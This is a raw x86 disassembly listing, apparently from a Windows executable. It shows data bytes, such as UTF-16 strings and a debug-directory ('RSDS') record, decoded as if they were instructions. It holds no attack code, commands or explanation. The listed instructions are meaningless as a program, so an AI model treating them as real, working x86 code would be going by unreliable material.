  43473a:	add    BYTE PTR [ecx],bh
  43473c:	add    BYTE PTR [edi+0x0],bl
  43473f:	dec    ebx
  434740:	add    BYTE PTR [ecx+0x0],al
  434743:	dec    edx
  434744:	add    BYTE PTR [esi+0x0],al
  434747:	xor    DWORD PTR [eax],eax
  434749:	xor    al,0x0
  43474b:	pop    edi
  43474c:	add    BYTE PTR [eax+0x0],bl
  43474f:	inc    edi
  434750:	add    BYTE PTR [edx+0x0],al
  434753:	add    BYTE PTR [eax],al
  434755:	push   eax
  434756:	add    BYTE PTR [ebx],dh
  434758:	add    BYTE PTR [esi+0x0],cl
  43475b:	pop    edi
  43475c:	add    BYTE PTR [eax+0x0],cl
  43475f:	xor    eax,0x5f005300
  434764:	add    BYTE PTR [eax+0x0],cl
  434767:	add    BYTE PTR [eax],al
  434769:	dec    ebp
  43476a:	add    BYTE PTR [eax],dh
  43476c:	add    BYTE PTR [edx+0x0],al
  43476f:	pop    edi
  434770:	add    BYTE PTR [edx+0x0],cl
  434773:	pop    eax
  434774:	add    BYTE PTR [eax+eax*1+0x49],dl
  434778:	add    BYTE PTR [eax+eax*1+0x39],cl
  43477c:	add    BYTE PTR [eax+eax*1+0x0],cl
  434780:	add    BYTE PTR [ecx+0x0],al
  434783:	xor    eax,DWORD PTR [eax]
  434785:	xor    BYTE PTR [eax],al
  434787:	pop    edi
  434788:	add    BYTE PTR [ecx+0x0],al
  43478b:	pop    edx
  43478c:	add    BYTE PTR [ecx+0x0],dl
  43478f:	pop    edx
  434790:	add    BYTE PTR [ecx],bh
  434792:	add    BYTE PTR [esi],dh
  434794:	add    BYTE PTR [edi+0x0],bl
  434797:	dec    eax
  434798:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43479c:	add    BYTE PTR [eax],al
  43479e:	add    BYTE PTR [ecx+0x0],dl
  4347a1:	push   edi
  4347a2:	add    BYTE PTR [ecx+0x0],bl
  4347a5:	pop    edi
  4347a6:	add    BYTE PTR [esi+0x0],dl
  4347a9:	xor    al,0x0
  4347ab:	inc    esp
  4347ac:	add    BYTE PTR [ecx],dh
  4347ae:	add    BYTE PTR [eax],bh
  4347b0:	add    BYTE PTR [edx],dh
  4347b2:	add    BYTE PTR [edi+0x0],bl
  4347b5:	cmp    DWORD PTR [eax],eax
  4347b7:	push   esp
  4347b8:	add    BYTE PTR [eax+eax*1+0x0],dl
  4347bc:	add    BYTE PTR [esi+0x0],dl
  4347bf:	dec    edi
  4347c0:	add    BYTE PTR [edi+0x0],al
  4347c3:	add    BYTE PTR ss:[edi+0x0],bl
  4347c7:	dec    edi
  4347c8:	add    BYTE PTR [edx+0x0],bl
  4347cb:	inc    ebp
  4347cc:	add    BYTE PTR [eax],dh
  4347ce:	add    BYTE PTR [ebp+0x0],al
  4347d1:	xor    BYTE PTR [eax],al
  4347d3:	pop    edi
  4347d4:	add    BYTE PTR [eax],dh
  4347d6:	add    BYTE PTR ds:0x4f000000,dh
  4347dc:	add    BYTE PTR ds:0x5f005700,dh
  4347e2:	add    BYTE PTR [edi],dh
  4347e4:	add    BYTE PTR [ebx+0x0],dl
  4347e7:	push   ebp
  4347e8:	add    BYTE PTR [edi+0x0],al
  4347eb:	xor    al,0x0
  4347ed:	pop    edi
  4347ee:	add    BYTE PTR [ecx+0x0],dl
  4347f1:	inc    esp
  4347f2:	add    BYTE PTR [eax],al
  4347f4:	add    BYTE PTR [edx+0x0],dl
  4347f7:	push   esp
  4347f8:	add    BYTE PTR ds:0x52005f00,dh
  4347fe:	add    BYTE PTR [edi+0x0],dl
  434801:	xor    al,BYTE PTR [eax]
  434803:	xor    al,BYTE PTR [eax]
  434805:	xor    BYTE PTR [eax],al
  434807:	xor    BYTE PTR [eax],al
  434809:	pop    edi
  43480a:	add    BYTE PTR [esi],dh
  43480c:	add    BYTE PTR [eax],al
  43480e:	add    BYTE PTR [eax+0x0],cl
  434811:	inc    ebp
  434812:	add    BYTE PTR [eax+eax*1+0x30],cl
  434816:	add    BYTE PTR [edi+0x0],bl
  434819:	dec    edx
  43481a:	add    BYTE PTR [edx],dh
  43481c:	add    BYTE PTR [edi],dh
  43481e:	add    BYTE PTR [ebp+0x0],dl
  434821:	add    BYTE PTR ss:[eax],dh
  434824:	add    BYTE PTR [eax],al
  434826:	add    BYTE PTR [esi+0x0],dl
  434829:	cmp    BYTE PTR [eax],al
  43482b:	dec    edi
  43482c:	add    BYTE PTR [ecx],bh
  43482e:	add    BYTE PTR [edi+0x0],bl
  434831:	pop    eax
  434832:	add    BYTE PTR [edx+0x0],bl
  434835:	dec    esp
  434836:	add    BYTE PTR [ebx+0x0],cl
  434839:	add    BYTE PTR [eax],al
  43483b:	dec    ecx
  43483c:	add    BYTE PTR [ebp+0x0],dl
  43483f:	dec    edi
  434840:	add    BYTE PTR [eax],al
  434842:	add    BYTE PTR [edx+0x53],dl
  434845:	inc    esp
  434846:	push   ebx
  434847:	clc    
  434848:	mov    ebp,edx
  43484a:	sub    DWORD PTR [edx+ecx*2],esi
  43484d:	mov    ebx,0x8dd9b349
  434852:	pop    edx
  434853:	xchg   edi,eax
  434854:	add    al,0xf4
  434856:	inc    edi
  434857:	sbb    al,BYTE PTR [eax]
  434859:	add    BYTE PTR [eax],al
  43485b:	push   ebx
  43485c:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  434860:	jne    0x4348db
  434862:	ins    DWORD PTR es:[edi],dx
  434863:	dec    ecx
  434864:	jb     0x4348e0
  434866:	pop    esp
  434867:	bound  di,DWORD PTR [edx+0x52]
  43486b:	gs fs push ax
  43486f:	arpl   WORD PTR [esi+0x5c],si
  434872:	js     0x4348ce
  434874:	je     0x4348bd
  434876:	jno    0x4348ba
  434878:	jno    0x4348e1
  43487a:	bound  ebp,QWORD PTR [esi]
  43487c:	jo     0x4348e2
  43487e:	bound  eax,QWORD PTR [eax]
	...
